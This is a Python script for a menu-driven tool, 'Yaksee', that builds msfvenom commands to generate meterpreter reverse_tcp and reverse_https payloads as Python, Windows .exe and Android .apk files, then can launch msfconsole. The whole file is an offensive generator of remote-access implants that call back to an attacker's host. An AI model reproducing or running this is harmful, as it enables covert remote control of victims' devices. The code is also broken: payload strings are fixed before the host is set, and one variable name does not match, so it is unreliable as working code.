'''#!/usr/bin/python3.6
#coding:utf-8'''
#DEB!
from time import *
from os import *
from random import *
system('clear')
random = randint(1, 9999)
i = True
ip = 'No selected'
port = 4444
number = 'No selected'
py2 = None
apk2 = None
exe2 = None

'''LES PAYLOADS'''

#PYTHON
pytcp = 'python/meterpreter/reverse_tcp LHOST={} LPORT={} -f py R> {}.py'.format(ip, port, random)
pyhttps = 'python/meterpreter/reverse_https LHOST={} LPORT={} -f py R> {}.py'.format(ip, port, random)
#PYTHON!

#WINDOWS
exetcp = 'windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe R> {}.exe'.format(ip, port, random)
exehttps = 'windows/meterpreter/reverse_https LHOST={} LPORT={} -f exe R> {}.exe'.format(ip, port, random)
#WINDOWS!

#APK
apktcp = 'android/meterpreter/reverse_tcp LHOST={} LPORT={} -f apk R> {}.apk'.format(ip, port, random)
apthttps = 'android/meterpreter/reverse_https LHOST={} LPORT={} -f apk R> {}.apk'.format(ip, port, random)
#APK!

"""PAYLOADS!"""

launch = 'No selected'
launch2= 'No selected'
fast=True
'''DEF'''
def MENU():
	try:
		select = input('Yaksee> ')
	except:
		print('BYE\nTHX FOR USING YAKSEE !')

def img():
	print('============================= WELCOM TO YAKSEE =================================')
	print('#                                                                              #')
	print('#          xxxxxxx         xxxxxx  ******************************************* #')
	print('#   xxxxxxxx           xxxxxx      *type   : select ur type of ur payloads     #')
	print('#    xxxxxxxx         xxxxxx       *                                           #')
	print('#     xxxxxxxx       xxxxxx        *show   :  show ur IP and port and payloads #')
	print('#      xxxxxxxx     xxxxxx         *                                           #')
	print('#       xxxxxxxx   xxxxxx          *help   :  show menu                        #')
	print('#        xxxxxxxx xxxxxx           *                                           #')
	print('#         xxxxxxxxxxxxx            *run    :  run generator                    #')
	print('#          xxxxxxx                 *                                           #')
	print('#           xxxxxxx    COMMAND:    *host   :  set host                         #')
	print('#            xxxxxxx               *                                           #')
	print('#             xxxxxxx              *number :  set number of payloads           #')
	print('#              xxxxxxx             *                                           #')
	print('#               xxxxxxx            *clear  :  clear txt                        #')
	print('#                                  *                                           #')
	print('#                                  *port   :  for change port                  #')
	print('#Default port is 4444              ********************************************#')
	print('================================================================================')
"""DEF!"""

img()
try:
	press = input('PRESS ENTER TO LAUNCH')
except KeyboardInterrupt:
	system('clear')
	print('BYE')
	quit('THX FOR USING YAKSEE !')
system('clear')
while i == True:
	try:
		select = input('Yaksee> ')
	except KeyboardInterrupt:
		system('clear')
		print('BYE')
		quit('THX FOR USING YAKSEE !')
		break
#SHOW
	if select == 'show':
		print('\n>ip={} port={} payloads={} number={}<'.format(ip, port,launch2, number))
		try:
			press = input('\nPRESS ENTER TO LAUNCH')
		except KeyboardInterrupt:
			system('clear')
			print('BYE')
			quit('THX FOR USING YAKSEE !')
			break
			system('clear')
		continue	
#SHOW!

#HELP
	if select == 'help':
		system('clear')
		img()
		try:
			press = input('PRESS ENTER TO LAUNCH')
		except KeyboardInterrupt:
			system('clear')
			print('BYE')
			quit('THX FOR USING YAKSEE !')
			system('clear')
			break
		system('clear')
		continue
#HELP!

#HOST/IP
	if select == 'host':
		try:
			ip = input('select ur ip : ')
		except KeyboardInterrupt:
			system('clear')
			print('BYE')
			quit('THX FOR USING YAKSEE !')
			break
			system('clear')
		system('clear')
		print('ur ip = {}'.format(ip))
		continue
#HOST!/IP

#NUMBER
	if select == 'number':
		try:
			number =input('choose the number of payloads u want : ')
			number = int(number)
		except KeyboardInterrupt:
			print('BYE')
			quit('THX FOR USING YAKSEE !')
			break
		except:
			print('U have not slect a valide number !')
			number = 'No selected'
			continue
		continue
#NUMBER!

#TYPE
	if select == 'type':
		while fast == True:
			system('clear')
			try:
				type_ = input('select ur payloads\n\n[1] Python /.py/ \n \n[2] Android /.apk/ \n \n[3] Windows /.exe/ \n\nGO BACK [99]\n: ')
			except KeyboardInterrupt:
				system('clear')
				print('BYE')
				quit('THX FOR USING YAKSEE !')
				break
				system('clear')
			if type_ == '99':
				system('clear')
				break
				"""PYTHON FILE"""
			if type_ == '1':
				try:
					py2 = input('\n[1] reverse_tcp [2] reverse_https\n\nGO BACK [99]\n: ')
				except KeyboardInterrupt:
					system('clear')
					print('BYE')
					quit('THX FOR USING YAKSEE !')
					break
					system('clear')
				if py2 == '1':
					launch = pytcp
					launch2 = 'PY file [reverse_tcp]'
					break
				if py2 == '2':
					launch = pyhttps
					launch2 = 'PY file [reverse_https]'
					break
				if py2 == '99':
					continue
					"""PYTHON FILE!"""
					
			"""APK FILE"""
			if type_ == '2':
				try:
					apk2 = input('\n[1] reverse_tcp [2] reverse_https\n\nGO BACK[99]\n: ')
				except KeyboardInterrupt:
					system('clear')
					print('BYE')
					quit('THX FOR USING YAKSEE !')
					break
					system('clear')
				if apk2 == '1':
					launch = apktcp
					launch2 = 'APK file [reverse_tcp]'
					break
				if apk2 == '2':
					launch = apkhttps
					launch2 = 'APK file [reverse_https]'
					break
				if apk2 == '99':
					continue
					"""APK FILE!"""
					
					
				
				"""EXE FILE"""
			if type_ == '3':
				try:
					exe2 = input('\nEXE file [1] reverse_tcp [2] reverse_https\n\nGO BACK [99]\n:')
				except KeyboardInterrupt:
					system('clear')
					print('BYE')
					quit('THX FOR USING YAKSEE !')
					break
					system('clear')
				if exe2 == '1':
					launch = exetcp
					launch2 ='EXE file [reverse_tcp]'
					break
				if exe2 == '2':
					launch = exehttps
					launch2 = 'EXE file [reverse_https]'
					break
			else:
				system('clear')
				print('U have not select!')
				continue
				"""EXE FILE!"""
#TYPE!

#RUN
	if select == 'run':
		print('\n>ip={} port={} payloads={} number={}<'.format(ip, port,launch2, number))
		try:
			ok = input('\nit\'s ok ? (Y/n): ')
		except KeyboardInterrupt:
			system('clear')
			print('BYE')
			quit('THX FOR USING YAKSEE !')
			break
		if ok == 'n':
			continue
		if ok == 'Y':
			system('msfvenom -p {}'.format(launch))
			msf = input('Do u want  open msfconsole ? Y/n: ')
			if msf == 'Y':
				system('msfconsole')
			if msf == 'n':
				continue
			else:
				continue
		else:
			continue
#RUN!

#CLEAR
	if select == 'clear':
		system('clear')
		continue
#CLEAR!

#PORT
	if select == 'port':
		try:
			port = input('choose ur port : ')
		except KeyboardInterrupt:
			system('clear')
			print('BYE')
			quit('THX FOR USING YAKSEE !')
			break
			system('clear')
			continue
#PORT!

#QUIT
	if select == 'exit':
		system('clear')
		quit('THX FOR USING YAKSEE !')
#QUIT!

#FIN!
